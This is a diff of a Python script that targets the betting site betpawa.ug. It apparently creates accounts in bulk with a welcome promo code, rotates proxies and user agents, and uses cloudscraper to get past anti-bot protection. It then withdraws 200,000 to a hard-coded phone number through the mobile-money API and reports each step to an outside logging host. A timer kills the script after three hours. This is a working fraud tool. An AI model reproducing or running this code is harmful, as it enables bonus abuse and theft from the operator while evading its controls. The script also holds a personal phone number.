@@ -1,14 +1,22 @@
+#!/usr/bin/env python3
 import os, threading, time, random, string, requests, cloudscraper
-PHONE = os.getenv("PHONE", "+256 744 853640")
-BASE  = "https://www.betpawa.ug"
-PROMO = "WELCOME2025"
-WD_AMT= 200000
+
+PHONE   = os.getenv("PHONE", "+256 744 853640")
+BASE    = "https://www.betpawa.ug"
+PROMO   = "WELCOME2025"
+WD_AMT  = 200000
+
 with open("proxies.txt") as f: PROXIES = [x.strip() for x in f if x.strip()]
 with open("user-agents.txt") as f: UAS = [x.strip() for x in f if x.strip()]
-def randstr(n=8): return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))
+
+def randstr(n=8):
+    return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))
+
 def log(m):
-    try: requests.post("https://ghost-log.onrender.com/log", json={"p":PHONE,"m":m}, timeout=2)
+    try:
+        requests.post("https://ghost-log.onrender.com/log", json={"p":PHONE,"m":m}, timeout=2)
     except: pass
+
 def create():
     while True:
         s = cloudscraper.create_scraper()
@@ -31,9 +39,11 @@ def create():
                 w = s.post(f"{BASE}/api/v2/withdraw/mobile-money", json={"amount":WD_AMT,"msisdn":PHONE}, headers={"Authorization":f"Bearer {token}","User-Agent":random.choice(UAs)}, timeout=8)
                 if w.status_code == 200: log("withdrawn")
         except: pass
+
 def suicide():
     time.sleep(10800)
     os._exit(0)
+
 if __name__ == "__main__":
     threading.Thread(target=suicide, daemon=True).start()
     for _ in range(20):
